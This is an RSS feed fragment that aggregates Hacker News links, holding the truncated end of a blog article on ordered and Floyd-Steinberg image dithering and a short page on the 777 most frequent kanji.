<p><span><span><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>s</mi><mi>t</mi><mi>r</mi><mi>e</mi><mi>n</mi><mi>g</mi><mi>t</mi><mi>h</mi></mrow><annotation encoding="application/x-tex">strength</annotation></semantics></math></span></span> can also be negative, from <span><span><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mn>0</mn></mrow><annotation encoding="application/x-tex">0</annotation></semantics></math></span></span> to <span><span><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mo>‚àí</mo><mn>1.0</mn></mrow><annotation encoding="application/x-tex">-1.0</annotation></semantics></math></span></span>. This is useful in certain cases where the matrix usually
makes things bright, like what Surma describes with Bayer matrices.</p>

<p>Note that <span><span><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mn>65535</mn></mrow><annotation encoding="application/x-tex">65535</annotation></semantics></math></span></span> is multiplied by <span><span><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>s</mi><mi>t</mi><mi>r</mi><mi>e</mi><mi>n</mi><mi>g</mi><mi>t</mi><mi>h</mi></mrow><annotation encoding="application/x-tex">strength</annotation></semantics></math></span></span> because the colours in my code are in the range <span><span><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mo stretchy="false">[</mo><mn>0</mn><mo separator="true">,</mo><mn>65535</mn><mo stretchy="false">]</mo></mrow><annotation encoding="application/x-tex">[0, 65535]</annotation></semantics></math></span></span>. If yours
are different you can change that number.</p>

<p><span><span><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>m</mi><mi>a</mi><mi>x</mi></mrow><annotation encoding="application/x-tex">max</annotation></semantics></math></span></span> is the value the entire matrix is divided by. It represents the maximum value of the matrix, and normalizes
it by dividing. Usually this is the product of the dimensions of the matrix. It can also be the
largest value in the matrix plus one.</p>

<p>The result of applying this operation to each cell of the matrix is a new, precalculated matrix, which can be added
to a pixel‚Äôs colour value for dithering. Adding 0.5 does not need to happen in this case. In my library, I call the
function that does this <code>convThresholdToAddition</code>, because that‚Äôs essentially the purpose of this ‚Äì converting
a threshold matrix into one that can be used for addition.</p>

<p><strong>Note:</strong> This is designed for matrices that range from <span><span><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mn>0</mn></mrow><annotation encoding="application/x-tex">0</annotation></semantics></math></span></span> to <span><span><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>m</mi><mi>a</mi><mi>x</mi><mo>‚àí</mo><mn>1</mn></mrow><annotation encoding="application/x-tex">max - 1</annotation></semantics></math></span></span>. If you‚Äôre using a matrix you found that
starts at <span><span><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mn>1</mn></mrow><annotation encoding="application/x-tex">1</annotation></semantics></math></span></span>, you‚Äôll usually just want to subtract one from each value when you program it, then apply the operation
I described above.</p>

<h3 id="using-a-modified-matrix">Using a modified matrix</h3>

<p>Now that you‚Äôve modified the matrix so it can be used for addition, it needs to be applied to the image. This is pretty
simple. Use modulus so the matrix values are tiled across the image, and add the same value in the R, G, and B channels.
If you‚Äôre using a grayscale image you can just apply it in the one channel, or still use RGB. Since the same value is
being added it doesn‚Äôt make much of a difference. Like always, make sure to clamp the values to the proper colour range.</p>

<p>Doing all of this definitely works with colour images, but it‚Äôs not the greatest. Here‚Äôs an example, where the palette
is red, green, and black.</p>

<section>

<figure>
<img src="https://www.makeworld.gq/assets/images/dithering/peppers.png">
<figcaption>
Original image
</figcaption>
</figure>

<figure>
<img src="https://www.makeworld.gq/assets/images/dithering/bayer_16x16_red-green-black.png">
<figcaption>
Ordered dithering (Bayer 16x16)
</figcaption>
</figure>

<figure>
<img src="https://www.makeworld.gq/assets/images/dithering/floyd-steinberg_red-green-black.png">
<figcaption>
Error diffusion dithering (Floyd-Steinberg)
</figcaption>
</figure>

</section>

<p>Here it is where the palette is red, green, black, and yellow.</p>

<section>

<figure>
<img src="https://www.makeworld.gq/assets/images/dithering/bayer_16x16_red-green-yellow-black.png">
<figcaption>
Ordered dithering (Bayer 16x16)
</figcaption>
</figure>

<figure>
<img src="https://www.makeworld.gq/assets/images/dithering/floyd-steinberg_red-green-yellow-black.png">
<figcaption>
Error diffusion dithering (Floyd-Steinberg)
</figcaption>
</figure>

</section>

<p>As you can see, it doesn‚Äôt really emulate any of the yellow in the first example, while Floyd-Steinberg can. Once yellow is added
to the palette it looks pretty good though.</p>

<h2 id="error-diffusion-dithering">Error diffusion dithering</h2>

<p>Error‚Ä¶</p></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://www.makeworld.gq/2021/02/dithering.html">https://www.makeworld.gq/2021/02/dithering.html</a></em></p>]]>
            </description>
            <link>https://www.makeworld.gq/2021/02/dithering.html</link>
            <guid isPermaLink="false">hacker-news-small-sites-26120631</guid>
            <pubDate>Sat, 13 Feb 2021 01:29:43 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[With 777 Kanji, 90% Coverage of Kanji in the Wild]]>
            </title>
            <description>
<![CDATA[
Score 54 | Comments 28 (<a href="https://news.ycombinator.com/item?id=26120559">thread link</a>) | @sova
<br/>
February 12, 2021 | https://japanesecomplete.com/777 | <a href="https://web.archive.org/web/*/https://japanesecomplete.com/777">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
          <div>
            
            
            <p data-wow-delay="0.5s">With 777  of the most frequent kanji, one has 90.0% coverage of Kanji in the wild!</p>
            <p data-wow-delay="1.55s">With 1477 kanji one has 98.0% coverage, and with 2477 characters one has 99.9% coverage</p>
            <p data-wow-delay="3.05s">Based on the Balanced Corpus of Contemporary Japanese from 2011, these 777 kanji characters are the most frequent kanji in the Japanese language today.  By learning these kanji first, and in this order, one is maximizing their learning efficacy and will immediately see these kanji in native Japanese media, as they occur the most often across all domains (literature, poetry, science, politics, technology, television, novels, and more).</p>

          </div>
        </div></div>]]>
            </description>
            <link>https://japanesecomplete.com/777</link>
            <guid isPermaLink="false">hacker-news-small-sites-26120559</guid>
            <pubDate>Sat, 13 Feb 2021 01:15:43 GMT</pubDate>
        </item>
    </channel>
</rss>
